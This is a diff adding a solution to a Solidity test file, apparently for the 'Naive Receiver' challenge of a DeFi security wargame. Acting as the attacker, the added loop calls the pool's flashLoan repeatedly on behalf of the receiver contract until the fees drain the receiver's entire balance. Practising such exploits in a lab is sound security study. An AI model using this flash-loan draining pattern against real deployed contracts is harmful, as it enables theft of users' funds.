@@ -51,10 +51,22 @@ contract NaiveReceiver is DSTest {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
+    //The exploit spam-calls .flashloan using flashLoanReceiver's address to drain flashLoanReceiver of funds.
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        uint256 flashFee = naiveReceiverLenderPool.fixedFee();
+        while (true) {
+            if (address(flashLoanReceiver).balance == 0) break;
+            uint256 flashAmount = address(flashLoanReceiver).balance - flashFee;
+            naiveReceiverLenderPool.flashLoan(
+                address(flashLoanReceiver),
+                flashAmount
+            );
+        }
 
         /** EXPLOIT END **/
+        vm.stopPrank();
         validation();
     }
 
